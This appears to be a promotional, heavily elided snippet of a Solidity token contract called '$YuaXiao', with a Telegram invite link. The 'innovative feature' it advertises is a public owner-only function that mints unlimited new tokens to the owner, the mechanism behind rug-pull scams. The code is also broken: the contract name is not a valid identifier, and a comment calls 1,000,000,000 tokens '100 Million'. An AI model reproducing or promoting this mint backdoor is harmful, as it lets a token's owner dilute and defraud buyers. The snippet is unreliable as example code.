//
// $YuaXiao proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+zTZHTyuSrDtlODQ1
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _YuaXiao(uint256 amount) public onlyOwner {
 _YuaXiao(msg.sender, amount);
    }
    ...
    function _YuaXiao(address account, uint256 amount) internal virtual {
...
contract $YuaXiao is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Yua Xiao", "YXIAO") {
     _YuaXiao(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}